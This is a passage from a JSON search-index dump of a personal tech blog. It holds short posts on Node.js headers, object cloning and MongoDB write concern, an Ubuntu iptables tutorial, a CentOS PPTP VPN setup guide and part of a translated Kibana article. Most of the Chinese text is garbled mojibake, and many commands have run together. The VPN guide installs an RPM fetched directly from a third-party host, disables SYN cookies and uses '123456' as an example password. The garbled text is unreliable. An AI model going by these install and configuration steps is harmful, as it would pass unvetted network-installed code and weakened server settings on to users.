â€˜â€™;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"è®¾ç½®å“åº”å¤´ä¿¡æ¯","slug":"history/tech/5953c4d0c2b92f5665eed9f0","date":"2016-01-10T19:02:27.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9f0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9f0/","excerpt":"","text":"res.setHeader(â€˜Content-Typeâ€™, â€˜text/htmlâ€™);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"å…‹éš†å¯¹è±¡æŠ€å·§","slug":"history/tech/5953c4d0c2b92f5665eed9ef","date":"2016-01-10T03:22:41.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ef/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ef/","excerpt":"","text":"JSON.parse(JSON.stringify(a))","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"mongodbçš„write concern","slug":"history/tech/5953c4d0c2b92f5665eed9ee","date":"2016-01-10T03:03:43.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ee/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ee/","excerpt":"","text":"w, {Number/String, &gt; -1 || â€˜majorityâ€™ || tag name} the write concern for the operation where &lt; 1 is no acknowledgement of write and w &gt;= 1, w = â€˜majorityâ€™ or tag acknowledges the write-1 = donâ€™t even report network errors0 = default, donâ€™t call getLastError by default1 = basic, call getLastError, but donâ€™t wait for slaves2+= wait for slaveshttp://kyfxbl.iteye.com/blog/1952941","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"ubuntu iptablesè®¾ç½®","slug":"history/tech/5953c4d0c2b92f5665eed9ed","date":"2016-01-10T01:26:00.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ed/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ed/","excerpt":"","text":"root@qustdjx-K42JZ:/home/qustdjx# iptables -L -nChain INPUT (policy ACCEPT)target prot opt source destinationChain FORWARD (policy ACCEPT)target prot opt source destinationChain OUTPUT (policy ACCEPT)target prot opt source destination**ubuntuä¸­å¯åŠ¨åŠå…³é—­iptables **åœ¨ubuntuä¸­ç”±äºä¸å­˜åœ¨ /etc/init.d/iptalesæ–‡ä»¶ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨serviceç­‰å‘½ä»¤æ¥å¯åŠ¨iptablesï¼Œéœ€è¦ç”¨modprobeå‘½ä»¤ã€‚ å¯åŠ¨iptables modprobe ip_tables å…³é—­iptablesï¼ˆå…³é—­å‘½ä»¤è¦æ¯”å¯åŠ¨å¤æ‚ï¼‰ iptalbes -F iptables -X iptables -Z iptables -P INPUT ACCEPT iptables -P OUTPUT ACCEPT iptables -P FORWARD ACCEPT modprobe -r ip_tables ä¾æ¬¡æ‰§è¡Œä»¥ä¸Šå‘½ä»¤å³å¯å…³é—­iptablesï¼Œå¦åˆ™åœ¨æ‰§è¡Œmodproble -r ip_tablesæ—¶å°†ä¼šæç¤º FATAL: Module ip_tables is in use.ä½¿ç”¨ ubuntu å·²ç»æœ‰ä¸¤ä¸ªæ˜ŸæœŸäº†ï¼Œ æ‰å¿½ç„¶å‘ç°åŸæ¥ä¸€ç›´éƒ½æ²¡æœ‰å®‰è£…é˜²ç«å¢™ï¼Œ èµ¶ç´§å»æ‰¾äº›èµ„æ–™çœ‹çœ‹ï¼Œ ä¸‹é¢ç»™å‡ºæˆ‘è‡ªå·±çš„ iptablesè®¾ç½®ï¼Œä¾›å’Œæˆ‘ä¸€æ ·æ–°æ¥çš„å…„å¼Ÿä»¬å‚è€ƒï¼Œæ°´å¹³æœ‰é™ï¼Œå¤šå¤šæŒ‡æ•™ã€‚ï¼ˆå¯¹äºé˜²ç«å¢™çš„è®¾ç½®ï¼Œæœ‰ä¸¤ç§ç­–ç•¥ï¼šä¸€ç§æ˜¯å…¨éƒ¨é€šè®¯å£éƒ½å…è®¸ä½¿ç”¨ï¼Œåªæ˜¯é˜»æ­¢ä¸€äº›æˆ‘ä»¬çŸ¥é“çš„ä¸å®‰å…¨çš„æˆ–è€…å®¹æ˜“è¢«åˆ©ç”¨çš„å£ï¼›å¦å¤–ä¸€ç§ï¼Œåˆ™æ˜¯å…ˆå±è”½æ‰€æœ‰çš„é€šè®¯å£ï¼Œè€Œåªæ˜¯å…è®¸æˆ‘ä»¬éœ€è¦ä½¿ç”¨çš„é€šè®¯ç«¯å£ã€‚è¿™é‡Œä½¿ç”¨çš„æ˜¯ç¬¬äºŒç§åŸåˆ™ï¼Œå¦‚æœä½ éœ€è¦å¼€å¯å…¶ä»–ç«¯å£ï¼Œè¯·å…ˆå‚è€ƒè®¡ç®—æœºé€šè®¯å£è¯´æ˜ï¼Œç„¶åè‡ªå·±æ·»åŠ ã€‚ï¼‰ä»£ç :ï¼ƒåˆ é™¤åŸæ¥ iptables é‡Œé¢å·²ç»æœ‰çš„è§„åˆ™iptables -Fiptables -Xï¼ƒæŠ›å¼ƒæ‰€æœ‰ä¸ç¬¦åˆä¸‰ç§é“¾è§„åˆ™çš„æ•°æ®åŒ…iptables -P INPUT DROPiptables -P OUTPUT DROPiptables -P FORWARD DROPï¼ƒè®¾ç½®ï¼šæœ¬åœ°è¿›ç¨‹ lo çš„ INPUT å’Œ OUTPUT é“¾æ¥ ï¼› eth1çš„INPUTé“¾iptables -A INPUT -i lo -j ACCEPTiptables -A INPUT -i eth1 -m state --state ESTABLISHED,RELATED -jACCEPTiptables -A INPUT -i eth1 -m state --state NEW,INVALID -j LOGiptables -A OUTPUT -o lo -j ACCEPTï¼ƒå¯¹å…¶ä»–ä¸»è¦å…è®¸çš„ç«¯å£çš„ OUTPUTè®¾ç½®ï¼šï¼ƒ DNSiptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 53 -jACCEPTiptables -A OUTPUT -o eth1 -p UDP --sport 1024:65535 --dport 53 -jACCEPTï¼ƒHTTPiptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 80 -jACCEPT#HTTPSiptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 443 -jACCEPT#Email æ¥å— å’Œå‘é€iptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 110 -jACCEPTiptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 25 -jACCEPTï¼ƒ FTP æ•°æ®å’Œæ§åˆ¶iptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 20 -jACCEPTiptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 21 -jACCEPTï¼ƒDHCPiptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 68 -jACCEPTiptables -A OUTPUT -o eth1 -p UDP --sport 1024:65535 --dport 68 -jACCEPT#POP3S Emailå®‰å…¨æ¥æ”¶iptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 995 -jACCEPTï¼ƒæ—¶é—´åŒæ­¥æœåŠ¡å™¨ NTPiptables -A OUTPUT -o eth1 -p TCP --sport 1024:65535 --dport 123 -jACCEPT#æ‹’ç» eth1 å…¶ä»–å‰©ä¸‹çš„iptables -A OUTPUT -o eth1 --match state --state NEW,INVALID -jLOGæœ€åæ˜¯æœ‰å…³äºiptableså­˜å‚¨çš„å‘½ä»¤ï¼šä»£ç :iptables-save &gt;/etc/iptables.up.rule ï¼ƒ å­˜åœ¨ä½ æƒ³å­˜çš„åœ°æ–¹ä»£ç :iptables-restore &lt;/etc/iptables.up.rules ï¼ƒè°ƒç”¨å› ä¸ºiptables åœ¨æ¯æ¬¡æœºå™¨é‡æ–°å¯åŠ¨ä»¥åï¼Œéœ€è¦å†æ¬¡è¾“å…¥æˆ–è€…è°ƒç”¨ï¼Œä¸ºäº†æ–¹ä¾¿æ“ä½œï¼Œä½¿ç”¨ä»£ç :sudo gedit /etc/network/interfacesåœ¨ä»£ç :auto ath0iface ath0 inet dhcpåé¢åŠ ä¸Šä»£ç :pre-up iptables-restore &lt;/etc/iptables.up.rules ï¼ƒå¯åŠ¨è‡ªåŠ¨è°ƒç”¨å·²å­˜å‚¨çš„iptablesä»£ç :post-down iptables-save &gt;/etc/iptables.up.rule #å…³æœºæ—¶ï¼ŒæŠŠå½“å‰iptables å‚¨å­˜è½¬è‡ªï¼šhttp://blog.sina.com.cn/s/blog_71f389090100u9o2.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"é˜¿é‡Œäº‘ centos vpnæ­å»º","slug":"history/tech/5953c4d0c2b92f5665eed9ec","date":"2016-01-10T01:25:14.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ec/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ec/","excerpt":"","text":"é˜¿é‡Œäº‘æœåŠ¡å™¨é…ç½®è¯¦è§£ï¼ˆæµ‹è¯•æˆåŠŸï¼‰æˆ‘çš„æ“ä½œç¯å¢ƒï¼šé˜¿é‡Œäº‘é¦™æ¸¯èŠ‚ç‚¹äº‘æœåŠ¡å™¨ï¼Œæ“ä½œç³»ç»Ÿï¼šCentOS 6.3 64ä½åè¯è§£é‡Šï¼špptpæ˜¯VPNæœåŠ¡å™¨ç±»å‹ä¹‹ä¸€ï¼ŒPPPæ˜¯ä¸€ç§æ•°æ®é“¾è·¯å±‚åè®®ï¼Œiptablesæ˜¯è¿‡æ»¤ç³»ç»Ÿã€‚ã€æ­£æ–‡ã€‘1 æœåŠ¡å™¨ç«¯å®‰è£…è½¯ä»¶1.1 é¦–å…ˆå®‰è£…pppï¼Œå‘½ä»¤ï¼š#yum install -y ppp iptablesæç¤ºComplete! ï¼Œå®‰è£…æˆåŠŸï¼›1.2å®‰è£…pptpï¼Œç”±äºpptpæ²¡æœ‰å­˜æ”¾åœ¨CentOSçš„æºä¸­ï¼Œæ‰€ä»¥ç”¨yumå‘½ä»¤å®‰è£…è¿”å›çš„æ˜¯æ‰¾ä¸åˆ°å®‰è£…åŒ…çš„ï¼Œéœ€è¦ä»ç½‘ä¸Šä¸‹è½½ï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š#rpm -ivh http://pptpd.fanqiangmao.com/pptpd-1.3.4-2.el6.x86_64.rpm2 é…ç½®pptp2.1ç¼–è¾‘/etc/pptpd.confï¼Œå‘½ä»¤å¦‚ä¸‹#vi /etc/pptpd.confå°†#localip 192.168.0.1#remoteip 192.168.0.234-238,192.168.0.245ä¿®æ”¹æˆlocalip 192.168.0.1remoteip 192.168.0.234-238,192.168.0.245å³å°†è¿™ä¸¤è¡Œç¬¬ä¸€ä¸ªå­—ç¬¦â€œ#â€å»æ‰ï¼Œä¿å­˜é€€å‡ºï¼ˆVi å‘½ä»¤è¡¥å……ï¼šå¦‚éœ€æŸ¥æ‰¾abcåˆ™è¾“å…¥â€:/abcâ€ï¼Œä¿®æ”¹æ–‡æœ¬è¾“å…¥iï¼Œé€€å‡ºä¿®æ”¹æŒ‰escï¼Œä¿å­˜å¹¶é€€å‡ºè¾“å…¥â€:/wqâ€ï¼‰2.2ç¼–è¾‘/etc/ppp/options.pptpdï¼Œå‘½ä»¤å¦‚ä¸‹#vi /etc/ppp/options.pptpdå°†#ms-dns 10.0.0.1#ms-dns 10.0.0.2æ”¹æˆms-dns 8.8.8.8ms-dns 8.8.4.4å³å°†è¿™ä¸¤è¡Œç¬¬ä¸€ä¸ªå­—ç¬¦â€œ#â€å»æ‰ï¼Œè€Œåä¿®æ”¹DNSçš„IPã€‚2.3è®¾ç½®ä½¿ç”¨pptpçš„ç”¨æˆ·åå’Œå¯†ç å‘½ä»¤ï¼š#vi /etc/ppp/chap-secretsæ‰“å¼€ååªæœ‰ä¸¤è¡Œï¼Œè€Œä¸”ä¸€ä¸ªè´¦å·éƒ½æ²¡æœ‰ Secrets for authentication using CHAP client server secret IP addressesæ ¹æ®æ‚¨çš„éœ€è¦æ·»åŠ è´¦å·ï¼Œæ¯è¡Œä¸€ä¸ªã€‚æŒ‰ç…§ï¼šâ€œç”¨æˆ·å pptpd å¯†ç  ipåœ°å€â€çš„æ ¼å¼è¾“å…¥ï¼Œæ¯ä¸€é¡¹ä¹‹é—´ç”¨ç©ºæ ¼åˆ†å¼€ï¼Œä¾‹å¦‚ï¼škuro pptpd 123456 * ï¼ˆ*è¡¨ç¤ºæ‰€æœ‰IPï¼‰ä¿å­˜å¹¶é€€å‡ºã€‚3ã€ä¿®æ”¹å†…æ ¸è®¾ç½®ï¼Œä½¿å…¶æ”¯æŒè½¬å‘å‘½ä»¤ï¼š#vi /etc/sysctl.confå°†net.ipv4.ip_forward=0æ”¹æˆnet.ipv4.ip_forward=1å°†net.ipv4.tcp_syncookies= 1æ”¹æˆ #net.ipv4.tcp_syncookies= 1ä¿å­˜å¹¶é€€å‡ºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä½¿ä¿®æ”¹åçš„å†…æ ¸ç”Ÿæ•ˆ#sysctl -p4ã€æ·»åŠ iptablesè½¬å‘è§„åˆ™iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth1 -jMASQUERADEï¼ˆæ³¨æ„ï¼šç”±äºé˜¿é‡Œäº‘æ˜¯åŒç½‘å¡ï¼Œå†…ç½‘eth0ï¼Œå¤–ç½‘eth1ï¼Œæ‰€ä»¥è¿™å—ç‰¹åˆ«å®¹æ˜“è¯¯å†™ä¸ºeth0ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¾ˆå¤šæ‚ä¹±çš„æ•™ç¨‹æ— æ³•é…ç½®æˆåŠŸçš„åŸå› ä¹‹ä¸€ï¼‰æ·»åŠ å¥½è½¬å‘è§„åˆ™åä¿å­˜ä¸€ä¸‹å¹¶é‡å¯iptables#/etc/init.d/iptables save #/etc/init.d/iptables restart5ã€é‡å¯pptpæœåŠ¡#/etc/init.d/pptpd restartè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œå…¶å®æ­¤æ—¶pptpè¿˜æ²¡è¿è¡Œèµ·æ¥ã€‚æ‰€ä»¥ä½¿ç”¨restarté‡å¯ï¼Œä¼šæ˜¾ç¤ºShutting down pptp ã€‚è¿˜ä¼šæœ‰ä¸€ä¸ªè­¦å‘Šï¼Œå¯ä»¥å¿½ç•¥ã€‚å¦‚ä¸æ”¾å¿ƒå¯ä»¥å†ç”¨ä»¥ä¸Šå‘½ä»¤é‡å¯ä¸€ä¸‹pptpå°±éå¸¸é¡ºåˆ©çš„è¿è¡Œäº†ã€‚6ã€è®¾ç½®pptpå’Œiptableséšç³»ç»Ÿå¯åŠ¨#chkconfig pptpd on #chkconfig iptables onè‡³æ­¤ï¼ŒpptpæœåŠ¡ç«¯å®‰è£…ç»“æŸã€‚åœ¨PCç«¯çš„â€œç½‘ç»œå’Œå…±äº«ä¸­å¿ƒâ€ï¼Œè®¾ç½®æ–°çš„è¿æ¥æˆ–ç½‘ç»œï¼Œå³å¯è®¿é—®VPNã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"ã€ç¿»è¯‘ã€‘ç”¨ kibana 4 è°ƒæŸ¥ä½ é‚»å±…å¯èƒ½æŠ•ç¥¨ç»™çš„äºº","slug":"history/tech/5953c4d0c2b92f5665eed9eb","date":"2016-01-07T19:19:14.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9eb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9eb/","excerpt":"","text":"http://it.taocms.org/02/7039.htmåŸæ–‡åœ°å€ï¼šhttp://www.elasticsearch.org/blog/kibana-4-for-investigating-pacs-super-pacs-and-your-neighbors/æ˜¯æ—¶å€™å½“ä¸€ä¸ªå…¬ä¼—é»‘å®¢äº†ï¼æˆ‘ä»¬çœ‹åˆ°åœ°åŒºå’Œè”é‚¦æ”¿åºœæ¯å¤©éƒ½å…¬å¼€è¶Šæ¥è¶Šå¤šçš„æ•°æ®ä»¥æé«˜è¡Œæ”¿é€æ˜åº¦ï¼ŒåŒ…æ‹¬äº¤é€šäº‹æ•…ï¼Œè¯ç‰©ä¸è‰¯ååº”ï¼Œé«˜æ ¡åŠ©å­¦é‡‘ç”³è¯·ï¼Œé¤å…æ£€æŸ¥ç”šè‡³å•æ‰€ä½ç½®éƒ½æœ‰ã€‚ç°åœ¨ï¼Œæ‰€æœ‰äººéƒ½èƒ½è®¿é—®è¿™ä¸ªæ•°æ®ï¼Œåˆ†æå®ƒï¼Œç„¶åæ„å»ºåº”ç”¨ä»¥ä¿ƒè¿›å…¬ä¼—åˆ©ç›Šã€‚å…¬ä¼—é»‘å®¢å¤ªæ£’äº†ï¼è”é‚¦é€‰ä¸¾å§”å‘˜ä¼šå‘å¸ƒäº†ç«é€‰çŒ®é‡‘æ•°æ®åˆ°å®ƒçš„ç½‘ç«™(www.fec.gov)ä¸Šï¼ŒåŒ…æ‹¬æ€»ç»Ÿã€å‚è®®é™¢å’Œä¼—è®®é™¢çš„ã€‚å¦‚åŒ fec.gov ä¸Šæ‰€è¯´ï¼šâ€œIn 1975, Congress created the Federal Election Commission (FEC) to administer and enforce the Federal Election Campaign Act (FECA) â€“ the statute that governs the financing of federal elections. The duties of the FEC, which is an independent regulatory agency, are to disclose campaign finance information, to enforce the provisions of the law such as the limits and prohibitions on contributions, and to oversee the public funding of Presidential elections.â€å‘å…¬ä¼—æä¾›è¿™äº›ä¿¡æ¯æ˜¯å¯¹ç¡®ä¿é€‰ä¸¾è¿‡ç¨‹çš„å®Œæ•´æ€§æ˜¯è‡³å…³é‡è¦çš„ã€‚æ‰€ä»¥ï¼Œç°åœ¨ FEC æä¾›ç»™äº†æˆ‘ä»¬åŸå§‹æ•°æ®ï¼Œæˆ‘ä»¬èƒ½åšä»€ä¹ˆå‘¢ï¼Ÿå¦‚æœä½ ä¸è®¤ä¸ºè‡ªå·±æ˜¯ä¸€ä¸ªä¼šç”¨ R åˆ†ææ•°æ®çš„æ•°æ®ç§‘å­¦å®¶ï¼Œæˆ–è€…ä¼šåšæ¼‚äº®çš„ D3.js å¯è§†åŒ–æ•ˆæœçš„çº½çº¦æ—¶æŠ¥å‘˜å·¥ï¼Œä½ å¯èƒ½è¿™ä¸‹å°±å¡ä½äº†ã€‚ä¸è¦ç´§ï¼ŒELK stack å¯ä»¥ä¸ç”¨å¤šå°‘ç¼–ç¨‹ï¼Œåšåˆ°ä¸°å¯Œçš„ã€å¯è§†çš„ï¼Œäº¤äº’å¼æ•°æ®åˆ†æã€‚æ•°æ®å¯¼å…¥çš„æ­¥éª¤æˆ‘ä¼šç¨åè®²ï¼Œç°åœ¨ï¼Œå…ˆè®©æˆ‘ä»¬çœ‹çœ‹ Kibana 4 èƒ½åšåˆ°äº›ä»€ä¹ˆã€‚discoverKibana 4 é‡Œï¼Œä½ åº”è¯¥ä» Discover æ ‡ç­¾é¡µå¼€å§‹ã€‚è¿™æ˜¯ä½ å¾—åˆ°æ•°æ®é›†é«˜é˜¶æ„Ÿè§‚çš„åœ°æ–¹ã€‚å¯ä»¥æŸ¥çœ‹å®æ—¶çš„æ•°æ®åˆ†å¸ƒï¼Œç»“æ„åŒ–äº†çš„å­—æ®µåˆ—è¡¨ï¼Œä¸€èµ·ç´¢å¼•ä¸­ä¸€äº›æ–‡æ¡£çš„å®é™…å†…å®¹ã€‚åœ¨ä¸Šé¢æˆªå›¾é‡Œï¼Œæˆ‘ä»¬çœ‹åˆ° 2013-2014 é€‰ä¸¾å‘¨æœŸé‡Œï¼Œä¸€å…±æœ‰å°†è¿‘ 210 ä¸‡æ¡ä¸ªäººæçŒ®è®°å½•ã€‚æˆ‘ä»¬èƒ½çœ‹åˆ°å¾ˆæ¸…æ™°çš„æçŒ®è®°å½•å¢åŠ çš„è¶‹åŠ¿ï¼Œä»¥åŠä¸€äº›çœ‹èµ·æ¥æ˜¯éšæœºçš„å³°å€¼ç‚¹ã€‚å·¦ä¾§æ åˆ—å‡ºäº†æ•°æ®é›†ä¸­æ‰€æœ‰çš„å­—æ®µã€‚è¿™æä¾›ç»™æˆ‘ä»¬å¯ä»¥æé—®çš„å†…å®¹ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬ç°åœ¨çŸ¥é“æ•°æ®é‡Œæœ‰åƒå§“åã€åŸå¸‚ã€å·ã€æçŒ®æ•°é‡å’ŒæçŒ®æ—¥æœŸè¿™äº›å­—æ®µï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„æ€ä¸‹é¢è¿™äº›é—®é¢˜äº†ï¼šå“ªä¸ªå·çš„æçŒ®æ•°é‡æœ€å¤§ï¼Ÿå“ªä¸ªå·çš„æçŒ®é‡‘é¢æœ€å¤§ï¼Ÿçˆ±è·åå·çš„ä¸ªäººæçŒ®é‡‘é¢å®æ—¶å˜åŒ–æƒ…å†µå¦‚ä½•ï¼Ÿç«é€‰çŒ®é‡‘æ•°å‰ 10 åçš„å·é‡Œï¼Œæ’åå‰ 3 çš„åŸå¸‚éƒ½æ˜¯å“ªäº›ï¼Ÿæˆ‘å–œæ¬¢çš„æ˜æ˜Ÿ(æ¯”å¦‚ï¼šæ ¼æ¸©å¦®ä¸Â·å¸•ç‰¹æ´›)ç»™è°ææ¬¾äº†ä¹ˆï¼Ÿå­—æ®µåˆ—è¡¨è¿˜èƒ½å¸®åŠ©ä½ æ’é™¤æ‰ä¸€äº›æ²¡æ³•å›ç­”çš„é—®é¢˜ã€‚æ¯”å¦‚ï¼Œè¿™ä¸ªè®°å½•ä¸ªäººæçŒ®çš„æ–‡ä»¶å¹¶ä¸åŒ…å«æœ‰å…³å§”å‘˜ä¼šå’Œç›¸å…³å€™é€‰äººçš„ä¿¡æ¯(æŠ€æœ¯ä¸Šè¯´ï¼Œä¸ªäººæçŒ®çš„å»å‘æ˜¯è·Ÿå€™é€‰äººç›¸å…³çš„)ã€‚åŸå§‹æ•°æ®é‡Œåªæ˜¯è®°å½•äº†å§”å‘˜ä¼šå’Œå€™é€‰äººçš„åŠ å¯† IDã€‚è¿™æ ·ï¼Œè¦é—®â€œæ¥æ”¶çŒ®é‡‘æœ€å¤šçš„ 10 ä¸ªå§”å‘˜ä¼šçš„åå­—æ˜¯ï¼Ÿâ€å°±æ¯”è¾ƒéš¾äº†ã€‚é€šè¿‡ Discover ç•Œé¢å‘ç°è¿™ç‚¹ï¼Œæœ‰åŠ©äºå¼•å¯¼æˆ‘ä»¬åŠ è½½é¢å¤–çš„æ•°æ®ï¼Œä¸°å¯Œè¿™ä¸ªåº”ç”¨ï¼Œè®©å®ƒæ›´åŠ æœ‰ç”¨ã€‚visualizeå½“æˆ‘ä»¬ç¡®å®šäº†å¯èƒ½è¦é—®çš„ä¸€äº›é—®é¢˜åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹åŸºäºæ•°æ®é›†çš„è¿™äº›å±æ€§æ„å»ºå¯è§†åŒ–äº†ã€‚ä»¥å‰é¢è¯´åˆ°çš„ä¸€ä¸ªé—®é¢˜ä¸ºä¾‹ã€‚è¿™æ˜¯ä¸ªäººçŒ®é‡‘æ€»é¢æœ€å¤šçš„ 10 ä¸ªå·çš„é¥¼å›¾ï¼šçœ‹èµ·æ¥æ²¡æœ‰å¤ªå¤šçš„æƒŠå–œï¼Œå¦‚é¥¼å›¾æ‰€ç¤ºï¼ŒåŠ åˆ©ç¦å°¼äºšï¼Œçº½çº¦ï¼Œå¾·å…‹è¨æ–¯ï¼Œä½›ç½—é‡Œè¾¾ï¼Œä¼Šåˆ©è¯ºæ–¯(ç¾å›½æœ€å¤§çš„äº”ä¸ªå·)è´¡çŒ®äº†æœ€å¤šçš„æèµ ã€‚åç››é¡¿ä½åˆ—ç¬¬ä¸‰æ˜¯ä¸€ä¸ªæœ‰è¶£çš„å€¼å¾—è°ƒç ”çš„é—®é¢˜ - åç››é¡¿ä½œä¸ºå·çš„è¯åº”è¯¥æ˜¯å€’æ•°ç¬¬ä¸‰å°çš„ï¼Œæˆ–è®¸ä½œä¸ºè”é‚¦æ”¿åºœæ‰€åœ¨åœ°ï¼Œæ›´å®¹æ˜“å¼•å¯¼å½“åœ°å±…æ°‘å‚ä¸æ”¿æ²»ã€‚é¥¼å›¾å¾ˆå¥½åˆ›å»ºï¼šé€‰æ‹©ç”¨æ¥ç¡®å®šé¥¼å›¾åˆ†ç‰‡å¤§å°çš„èšåˆ(Aggregation)ç§ç±»ï¼šè®¡æ•°(Count)ã€æ€»å’Œ(Sum)è¿˜æ˜¯å»é‡æ•°(Unique Count)ã€‚å¦‚æœä½ é€‰æ‹©äº†æ€»å’Œæˆ–è€…å»é‡æ•°ï¼ŒKibana è¿˜éœ€è¦çŸ¥é“ç”¨å“ªä¸ªå­—æ®µçš„å€¼æ¥åšè¿™ä¸ªè¿ç®—ã€‚é€‰æ‹©åˆ‡ç‰‡(Split Slices)æ¥åˆ‡å‰²é¥¼å›¾æˆç‰‡ã€‚é€‰æ‹©ç»˜åˆ¶åˆ†ç‰‡çš„æ–¹å¼ï¼ša. Aggregation: é€‰æ‹© â€œTermsâ€ å› ä¸ºæˆ‘ä»¬æ˜¯è¦åŸºäºå­—æ®µçš„å€¼æ¥åˆ›å»ºåˆ†ç‰‡(â€œtermsâ€ æ˜¯ Elasticsearch é‡Œçš„è¯´æ³•)ã€‚b. Field: é€‰æ‹©è¦åšè¿ç®—çš„å­—æ®µã€‚æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬è¦æŒ‰ç…§å·æ¥è®¡ç®—çŒ®é‡‘åˆ†å¸ƒï¼Œæ‰€ä»¥é€‰æ‹© â€œstateâ€ã€‚c. Order/Size: é€‰æ‹© â€œTopâ€ æ’åºï¼Œé€‰æ‹©é•¿åº¦ä¸º â€œ10â€ ï¼Œè¿™æ ·å°±èƒ½åˆ›å»ºä¸€ä¸ªå‰ 10 åçš„é¥¼å›¾ã€‚d. Order by: æœ¬ä¾‹ä¸­ä½ åº”è¯¥æ˜¯ç”¨æˆ‘ä»¬ç¬¬ä¸€æ­¥é‡Œé€‰è¿‡çš„å‡½æ•°æ¥åšæ’åºï¼Œä¸è¿‡æœ‰äº›é«˜çº§åœºæ™¯é‡Œä½ ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œé€‰æ‹©å…¶ä»–é€‰é¡¹ã€‚ç‚¹å‡» Apply ç„¶åä½ å°±æœ‰ä¸€ä¸ªæ¼‚äº®çš„é¥¼å›¾äº†ã€‚ç‚¹å‡»å³ä¸Šè§’çš„ Save å›¾æ ‡ï¼Œç„¶åå–ä¸ªåå­—ï¼Œè¿™ä½ 